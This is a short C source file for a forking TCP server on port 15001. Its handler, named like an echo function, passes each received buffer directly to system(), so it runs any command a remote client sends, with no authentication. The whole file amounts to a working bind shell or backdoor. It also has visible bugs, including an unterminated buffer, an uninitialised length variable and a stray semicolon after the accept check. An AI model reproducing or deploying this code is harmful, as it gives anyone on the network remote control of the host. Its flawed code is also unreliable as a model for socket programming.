#include<sys/types.h>
#include<sys/socket.h>
#include<sys/stat.h>
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<netinet/in.h>
#include<arpa/inet.h>

void str_echo(int connfd)
{
int bufsize=4096,len,n;
char *buf=malloc(bufsize);

again:while((n=recv(connfd,buf,bufsize,0))>0)
system(buf);
if(n<0)
goto again;
}




int main()
{
int sockfd,connfd,addrlen,pid;
struct sockaddr_in servaddr,cliaddr;
servaddr.sin_family=AF_INET;
servaddr.sin_addr.s_addr=INADDR_ANY;
servaddr.sin_port=htons(15001);

if((sockfd=socket(AF_INET,SOCK_STREAM,0))>0)
printf("Socket created\n");

if(bind(sockfd,(struct sockaddr*)&servaddr,sizeof(servaddr))==0)
printf("Binding socket\n");

listen(sockfd,3);

getsockname(sockfd,(struct sockaddr*)&servaddr,&addrlen);
printf("Server is listening on port %d\n",servaddr.sin_port);

for(;;)
{

addrlen=sizeof(struct sockaddr_in);
if((connfd=accept(sockfd,(struct sockaddr*)&cliaddr,&addrlen))>0);
printf("Client %s is connected\n",inet_ntoa(cliaddr.sin_addr));
if((pid=fork())==0)
{
printf("Inside child\n");
close(sockfd);
str_echo(connfd);
exit(0);
}
close(connfd);
}
return 0;
}




